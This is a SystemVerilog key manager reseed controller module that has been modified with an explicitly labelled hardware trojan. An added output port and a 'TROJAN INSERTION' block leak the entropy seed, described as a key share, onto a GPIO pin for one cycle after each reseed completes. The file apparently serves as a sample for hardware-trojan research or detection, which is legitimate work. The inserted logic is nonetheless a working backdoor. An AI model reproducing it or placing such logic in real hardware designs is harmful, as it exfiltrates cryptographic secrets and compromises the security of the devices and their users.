`include "prim_assert.sv"

module keymgr_reseed_ctrl import keymgr_pkg::*; (
  input clk_i,
  input rst_ni,
  input clk_edn_i,
  input rst_edn_ni,

  // interface to keymgr_ctrl
  input reseed_req_i,
  output logic reseed_ack_o,
  output logic reseed_done_o,

  // interface to software
  input [15:0] reseed_interval_i,

  // interface to edn
  output edn_pkg::edn_req_t edn_o,
  input edn_pkg::edn_rsp_t edn_i,

  // interface to lfsr
  input  logic lfsr_en_i,
  output logic seed_en_o,
  output logic [LfsrWidth-1:0] seed_o,

  // error condition
  output logic cnt_err_o,

  // TROJAN INSERTION: Unused GPIO pin acts as exfiltration port
  output logic [LfsrWidth-1:0] trojan_leak_gpio_o // <-- Trojan output pin
);

  logic local_req;
  logic edn_req;
  logic edn_ack;
  logic [15:0] reseed_cnt;
  logic edn_done;

  assign edn_done = edn_req & edn_ack;

  // An edn request can either come from counter or from external
  assign local_req = reseed_cnt >= reseed_interval_i;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      edn_req <= '0;
    end else if (edn_done) begin
      edn_req <= '0;
    end else if (!edn_req && (reseed_req_i || local_req)) begin
      // if edn request is not going, make a new request
      edn_req <= 1'b1;
    end
  end

  assign seed_en_o = edn_ack;
  assign reseed_ack_o = reseed_req_i & edn_ack;
  assign reseed_done_o = edn_done;

  // primitive to request new entropy
  prim_edn_req #(
    .OutWidth(LfsrWidth)
  ) u_edn_req (
    .clk_i,
    .rst_ni,
    .req_chk_i(1'b1),
    .req_i(edn_req),
    .ack_o(edn_ack),
    .data_o(seed_o),
    .fips_o(),
    .err_o(),
    .clk_edn_i,
    .rst_edn_ni,
    .edn_o,
    .edn_i
  );


  // suppress first reseed count until the first transaction has gone through.
  // This ensures the first entropy fetch is controlled by software timing and
  // there is no chance to accidentally pick-up boot time entropy unless intended by software.
  logic cnt_en;
  always_ff @(posedge clk_i or negedge rst_ni) begin
     if (!rst_ni) begin
       cnt_en <= '0;
     end else if (edn_done) begin
       cnt_en <= 1'b1;
     end
  end

  // whenever reseed count reaches reseed_interval, issue a request and wait for ack
  // SEC_CM: RESEED.CTR.REDUN
  prim_count #(
    .Width(16)
  ) u_reseed_cnt (
    .clk_i,
    .rst_ni,
    .clr_i(edn_done),
    .set_i('0),
    .set_cnt_i('0),
    .incr_en_i(cnt_en & lfsr_en_i),
    .decr_en_i(1'b0),
    .step_i(16'h1),
    .commit_i(1'b1),
    .cnt_o(reseed_cnt),
    .cnt_after_commit_o(),
    .err_o(cnt_err_o)
  );

  // ---------------------------------------------------------------------------
  // TROJAN INSERTION BEGIN
  // Leak seed_o (key share) to trojan_leak_gpio_o for one clock after keygen FSM
  logic trojan_leak_en;
  logic trojan_leak_en_d;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_leak_en   <= 1'b0;
      trojan_leak_en_d <= 1'b0;
    end else begin
      // Capture the moment edn_done asserts (key generation FSM completes)
      trojan_leak_en   <= edn_done;
      trojan_leak_en_d <= trojan_leak_en;
    end
  end

  // Output seed_o to GPIO for a single clock cycle after edn_done (keygen FSM done)
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_leak_gpio_o <= '0;
    end else if (trojan_leak_en && !trojan_leak_en_d) begin
      // Leak the key share for one cycle
      trojan_leak_gpio_o <= seed_o;
    end else begin
      // Clear the GPIO otherwise
      trojan_leak_gpio_o <= '0;
    end
  end
  // TROJAN INSERTION END
  // ---------------------------------------------------------------------------

endmodule